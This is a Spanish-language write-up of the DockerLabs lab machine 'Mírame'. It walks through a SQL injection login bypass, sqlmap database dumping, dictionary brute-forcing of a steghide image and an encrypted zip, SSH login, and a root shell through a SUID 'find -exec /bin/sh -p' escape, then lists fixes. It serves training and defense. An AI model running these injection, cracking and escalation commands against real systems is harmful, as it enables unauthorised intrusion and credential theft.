# Mírame (DockerLabs) — Writeup

Dificultad: fácil

"Mírame" es una invitación bastante directa, y la máquina se la toma en serio: literalmente hay una imagen en algún directorio escondido pidiendo que la mires con atención, porque dentro de ella hay bastante más de lo que parece a simple vista. El camino hasta ahí pasa por una inyección SQL en un login que ni siquiera intenta disimular, seguida de una muñeca rusa de capas ocultas: una imagen con esteganografía, que esconde un zip protegido con contraseña, que a su vez esconde las credenciales finales. Cada capa con su propia herramienta de fuerza bruta correspondiente.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

Esta máquina se puede resumir como un ejercicio de paciencia en capas: primero hay que reventar un formulario de login vulnerable a inyección SQL para extraer toda una tabla de usuarios de la base de datos. Entre esos usuarios hay uno que no encaja con el resto — y resulta ser la llave a un directorio oculto en la web. Dentro de ese directorio, una imagen que hay que forzar con esteganografía para sacar un archivo comprimido, que a su vez hay que forzar de nuevo para sacar las credenciales finales de acceso por SSH. Y para cerrar, una escalada de privilegios que depende de un detalle fácil de pasar por alto en un listado de binarios SUID.

---

## Paso 0: desplegar y reconocer

```bash
unzip mirame.zip
bash auto_deploy.sh mirame.tar
```

Con la IP confirmada por el script de despliegue, toca el escaneo habitual:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22,80 172.17.0.2
```

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3
80/tcp open  http    Apache httpd 2.4.61 (Debian)
|_http-title: Login Page
```

Un panel de login como única superficie web visible. El primer instinto ante cualquier login es probar credenciales por defecto (`admin:admin` y variantes), pero aquí no llevan a ningún lado. Toca fuzzing de directorios para ver qué más hay alrededor.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k -r
```

```
/auth.php    (Status: 200)
/index.php   (Status: 200)
/page.php    (Status: 200)
```

Nada que grite "aquí está el fallo" a simple vista. Pero `auth.php` es justo el tipo de endpoint donde conviene probar el clásico de cualquier formulario de login: inyección SQL.

---

## Paso 1: el login que se abre con una comilla

```
Usuario: admin' OR 1=1-- -
Contraseña: admin' OR 1=1-- -
```

Y funciona. El payload clásico de bypass de autenticación por inyección SQL redirige a `page.php`, confirmando que el formulario concatena la entrada directamente en la consulta sin ningún tipo de preparación de sentencias (prepared statements) ni escapado de caracteres especiales. Con la inyección confirmada, el siguiente paso lógico es automatizar la extracción completa de la base de datos con sqlmap, en vez de seguir probando payloads a mano.

---

## Paso 2: dejar que sqlmap haga el trabajo pesado

Se captura la petición de login con Burp Suite y se guarda como `request.txt`, con el formato completo de la petición POST incluyendo cabeceras.

```bash
sqlmap -r request.txt --dbs
```

sqlmap confirma que el parámetro `password` es inyectable por múltiples técnicas (booleana ciega, basada en error, y basada en tiempo), y devuelve dos bases de datos: `information_schema` (la de sistema, sin interés) y **`users`**.

```bash
sqlmap -r request.txt -D users --tables
```

Una única tabla: `usuarios`.

```bash
sqlmap -r request.txt -D users -T usuarios --columns
```

Tres columnas: `id`, `username`, `password`.

```bash
sqlmap -r request.txt -D users -T usuarios -C id,username,password --dump
```

```
| id | username   | password               |
| 1  | admin      | chocolateadministrador |
| 2  | lucas      | lucas                  |
| 3  | agustin    | soyagustin123          |
| 4  | directorio | directoriotravieso     |
```

Cuatro filas, y una de ellas destaca inmediatamente por no encajar con el resto: no hay ningún usuario "directorio" en un sistema normal — el nombre en sí ya es una pista de que no se trata de una cuenta real, sino de otra cosa disfrazada de fila de base de datos.

---

## Paso 3: cuando una "contraseña" es en realidad una ruta

Probando la palabra `directoriotravieso` directamente como ruta en la URL:

```
http://172.17.0.2/directoriotravieso/
```

Y ahí aparece: un directorio real en el servidor con una imagen dentro, `miramebien.jpg`. El nombre del "usuario" de la base de datos no era una credencial en absoluto — era el nombre de un directorio oculto camuflado entre filas de una tabla, y su "contraseña" era la ruta exacta para acceder a él. Una forma bastante ingeniosa de esconder una pista en un sitio donde nadie esperaría buscarla.

---

## Paso 4: la imagen que pide fuerza bruta

Con la imagen descargada, toca comprobar si esconde algo mediante esteganografía. La herramienta `steghide` requiere conocer la contraseña de extracción, así que se automatiza el intento con un script que recorre un diccionario:

```bash
#!/bin/bash
stegofile="miramebien.jpg"
outputfile="output.txt"
wordlist="/usr/share/wordlists/rockyou.txt"

while read -r password; do
  steghide extract -sf "$stegofile" -p "$password" -xf "$outputfile" -f &> /dev/null
  if [ $? -eq 0 ]; then
    echo "¡Contraseña encontrada!: $password"
    exit 0
  fi
done < "$wordlist"
```

```
¡Contraseña encontrada!: chocolate
```

Vale la pena notar que existe una alternativa más directa a este script casero: **stegseek**, una herramienta especializada precisamente en hacer fuerza bruta de extracción de steghide contra un diccionario, sin necesidad de reinventar el bucle a mano.

```bash
steghide extract -sf miramebien.jpg
# Enter passphrase: chocolate
# wrote extracted data to "ocultito.zip"
```

Primera capa resuelta: dentro de la imagen había un archivo comprimido.

---

## Paso 5: el zip que también tiene su propia contraseña

`ocultito.zip` está, como era de esperar, protegido con contraseña. Para este tipo de cifrado, la combinación clásica es extraer el hash con `zip2john` y atacarlo con `john`:

```bash
zip2john ocultito.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
stupid1          (ocultito.zip/secret.txt)
```

Contraseña encontrada: `stupid1`. Con ella:

```bash
unzip ocultito.zip
```

Segunda capa resuelta, y dentro aparece finalmente `secret.txt`.

---

## Paso 6: las credenciales, al fin

```bash
cat secret.txt
```

```
carlos:carlitos
```

Tres capas de indirección (base de datos → directorio oculto → esteganografía → zip cifrado) para llegar, al final, a un usuario y contraseña de sistema perfectamente normales.

```bash
ssh carlos@172.17.0.2
```

Acceso conseguido.

---

## Paso 7: escalada — encontrando la aguja SUID en el pajar

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

El listado de binarios SUID en un sistema Debian estándar suele ser largo, y la mayoría son perfectamente normales y esperables: `passwd`, `sudo`, `su`, `mount`, `chsh`, herramientas del propio sistema que necesitan legítimamente el bit SUID para funcionar. La clave aquí es no dejarse llevar por la longitud de la lista y revisar cada entrada con calma:

```
-rwsrwxrwx   1 root     root         224848 Jan  8  2023 /usr/bin/find
```

Ahí está lo que no debería estar: **`/usr/bin/find`** con el bit SUID activo, y además con permisos de escritura para todo el mundo (`rwxrwxrwx`) — una combinación doblemente descuidada. `find` no es un binario que en circunstancias normales necesite privilegios elevados para funcionar, y de hecho está catalogado en GTFOBins precisamente por su capacidad de ejecutar comandos arbitrarios a través de su flag `-exec`.

```bash
find . -exec /bin/sh -p \; -quit
```

El flag `-exec` le pide a `find` que ejecute un comando por cada resultado encontrado; en este caso, se le dice que ejecute directamente una shell (`/bin/sh -p`, donde `-p` preserva los privilegios efectivos en vez de descartarlos) y que pare en cuanto la primera ejecución tenga éxito (`-quit`). Como el propio `find` corre con el bit SUID de root, la shell resultante hereda esos mismos privilegios.

```bash
id
# uid=0(root)
```

Root conseguido.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Vulnerabilidad inicial | Inyección SQL en `auth.php` (bypass y extracción vía sqlmap) |
| Pista camuflada | Fila "directorio:directoriotravieso" → ruta oculta en la web |
| Capa 1 (imagen) | Esteganografía con steghide, contraseña por fuerza bruta con rockyou |
| Capa 2 (zip) | Cifrado ZIP, hash extraído con zip2john y roto con john |
| Credenciales finales | carlos:carlitos, dentro de `secret.txt` |
| Vector de escalada | `/usr/bin/find` con SUID (y permisos de escritura universal) |
| Resultado final | root vía `find -exec /bin/sh -p` |

---

## Qué falló aquí (y cómo se evita)

1. **Consultas SQL construidas por concatenación directa de la entrada del usuario.** El formulario de login no usaba sentencias preparadas ni ningún tipo de escapado, permitiendo que una simple comilla alterara la lógica de la consulta. Es la vulnerabilidad web más antigua y, aun así, la más recurrente en aplicaciones mal desarrolladas.
2. **Ocultar rutas sensibles disfrazándolas de datos de usuario en la base de datos.** Aunque ingenioso como reto, en un entorno real la seguridad por oscuridad (esconder una ruta en vez de protegerla con autenticación real) nunca es una defensa suficiente — cualquier fuga de la base de datos, como la ocurrida aquí vía inyección SQL, expone la ruta igualmente.
3. **Contraseñas de esteganografía y de compresión ZIP presentes en diccionarios comunes.** Tanto `chocolate` como `stupid1` son palabras que aparecen en rockyou.txt. Cualquier contraseña usada para proteger contenido oculto o cifrado debería tener una complejidad muy superior a la de una palabra de diccionario.
4. **Binario del sistema con SUID innecesario y permisos de escritura universales.** Que `find` tuviera el bit SUID activo ya sería grave por sí solo; que además cualquier usuario pudiera sobrescribir el propio binario (`rwxrwxrwx`) agrava la situación de forma innecesaria. Ningún binario debería tener SUID salvo necesidad estrictamente justificada, y ninguno debería ser escribible por usuarios sin privilegios, sea cual sea su propósito.

---

## Referencias

- GTFOBins — find: https://gtfobins.github.io/gtfobins/find/#suid
- steghide: http://steghide.sourceforge.net/
- stegseek: https://github.com/RickdeJager/stegseek
- John the Ripper: https://www.openwall.com/john/
- sqlmap: https://sqlmap.org/
- DockerLabs: https://dockerlabs.es/
